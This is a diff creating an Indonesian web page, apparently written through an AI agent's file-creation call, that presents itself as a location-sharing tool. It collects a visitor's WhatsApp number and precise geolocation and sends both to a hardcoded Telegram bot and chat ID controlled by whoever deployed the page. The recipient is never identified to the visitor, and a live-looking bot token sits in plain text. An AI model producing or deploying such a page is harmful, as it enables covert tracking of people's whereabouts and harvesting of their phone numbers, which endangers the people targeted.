@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Lacak Lokasi via WhatsApp & Kirim Telegram</title>
+  <style>
+    /* Reset and base */
+    * {
+      box-sizing: border-box;
+      margin: 0; padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    body {
+      background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      color: #fff;
+      padding: 20px;
+      max-width: 350px;
+      margin: 0 auto;
+      height: 600px;
+      user-select: none;
+    }
+    h1 {
+      font-size: 1.6rem;
+      margin-bottom: 1rem;
+      text-align: center;
+      text-shadow: 0 0 6px rgba(0,0,0,0.3);
+    }
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 0.3rem;
+      font-size: 0.9rem;
+    }
+    input[type="tel"] {
+      width: 100%;
+      border-radius: 6px;
+      border: none;
+      padding: 0.6rem 1rem;
+      font-size: 1rem;
+      margin-bottom: 1rem;
+      outline: none;
+      transition: box-shadow 0.3s ease;
+    }
+    input[type="tel"]:focus {
+      box-shadow: 0 0 8px #fff;
+    }
+    button {
+      width: 100%;
+      background-color: #ff5722;
+      color: white;
+      border: none;
+      font-weight: 700;
+      font-size: 1rem;
+      padding: 0.75rem 1rem;
+      border-radius: 8px;
+      cursor: pointer;
+      box-shadow: 0 6px #e64a19;
+      transition: background-color 0.3s ease;
+      user-select: none;
+    }
+    button:active {
+      background-color: #e64a19;
+      box-shadow: 0 2px #b23911;
+      transform: translateY(2px);
+    }
+    .status {
+      margin-top: 1rem;
+      text-align: center;
+      font-weight: 600;
+      min-height: 1.4rem;
+      word-wrap: break-word;
+      font-size: 0.95rem;
+      filter: drop-shadow(0 1px 1px rgba(0,0,0,0.2));
+    }
+    footer {
+      margin-top: auto;
+      font-size: 0.8rem;
+      opacity: 0.7;
+      text-align: center;
+      user-select: text;
+    }
+    @media (max-width: 360px) {
+      body {
+        padding: 15px;
+        height: 580px;
+      }
+      h1 {
+        font-size: 1.4rem;
+      }
+      button {
+        font-size: 0.95rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <h1>Lacak Lokasi via WhatsApp & Kirim Telegram Bot</h1>
+
+  <label for="whatsapp-number">Nomor WhatsApp Anda</label>
+  <input type="tel" id="whatsapp-number" placeholder="Contoh: 6281234567890" pattern="[0-9]+" inputmode="numeric" autocomplete="off" required />
+
+  <button id="send-location">Kirim Lokasi ke Telegram</button>
+
+  <div class="status" id="status"></div>
+
+  <footer>
+    &copy; 2024 Lacak Lokasi
+  </footer>
+
+  <script>
+    // --- Configuration: Replace these with your actual Telegram Bot Token and Chat ID ---
+    const TELEGRAM_BOT_TOKEN = "8051593906:AAFeMij6V_XGMcRsL1Jkf5XpP_P3VAKo0Mo";
+    const TELEGRAM_CHAT_ID = "6374002294";
+
+    const btn = document.getElementById('send-location');
+    const statusDiv = document.getElementById('status');
+    const waInput = document.getElementById('whatsapp-number');
+
+    function updateStatus(message, isError = false) {
+      statusDiv.textContent = message;
+      statusDiv.style.color = isError ? "#ffcccc" : "#ccffcc";
+    }
+
+    // Validate WhatsApp number (simple check)
+    function validateNumber(number) {
+      // Basic validation: must be digits, min length 10, max 15 (international format)
+      const regex = /^[0-9]{10,15}$/;
+      return regex.test(number);
+    }
+
+    async function sendMessageToTelegram(text) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const payload = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: text,
+        parse_mode: "HTML"
+      };
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        const data = await response.json();
+        if (!data.ok) {
+          throw new Error(data.description || "Gagal mengirim pesan Telegram");
+        }
+        return true;
+      } catch (error) {
+        throw new Error("Error mengirim pesan ke Telegram: " + error.message);
+      }
+    }
+
+    btn.addEventListener('click', async () => {
+      const number = waInput.value.trim();
+      if (!validateNumber(number)) {
+        updateStatus("Masukkan nomor WhatsApp yang valid (hanya angka, minimum 10 digit)", true);
+        return;
+      }
+
+      if (!navigator.geolocation) {
+        updateStatus("Geolokasi tidak didukung di perangkat ini", true);
+        return;
+      }
+
+      updateStatus("Meminta izin lokasi...");
+      btn.disabled = true;
+
+      navigator.geolocation.getCurrentPosition(async (position) => {
+        const { latitude, longitude, accuracy } = position.coords;
+        updateStatus("Lokasi ditemukan! Mengirim ke Telegram...");
+
+        const mapsLink = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
+        const message = `<b>📍 Lokasi Terkirim</b>\nNomor WhatsApp: ${number}\nLatitude: ${latitude}\nLongitude: ${longitude}\nAkurasi: ±${accuracy} meter\nLink Google Maps: ${mapsLink}`;
+
+        try {
+          await sendMessageToTelegram(message);
+          updateStatus("✅ Lokasi berhasil dikirim ke Telegram!");
+        } catch (err) {
+          updateStatus(err.message, true);
+        } finally {
+          btn.disabled = false;
+        }
+      }, (error) => {
+        btn.disabled = false;
+        switch(error.code) {
+          case error.PERMISSION_DENIED:
+            updateStatus("Izin lokasi ditolak. Tidak bisa melacak lokasi.", true);
+            break;
+          case error.POSITION_UNAVAILABLE:
+            updateStatus("Lokasi tidak tersedia.", true);
+            break;
+          case error.TIMEOUT:
+            updateStatus("Waktu permintaan lokasi habis.", true);
+            break;
+          default:
+            updateStatus("Terjadi kesalahan saat mengambil lokasi.", true);
+            break;
+        }
+      }, {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      });
+    });
+  </script>
+</body>
+</html>
+</content>
+</create_file>
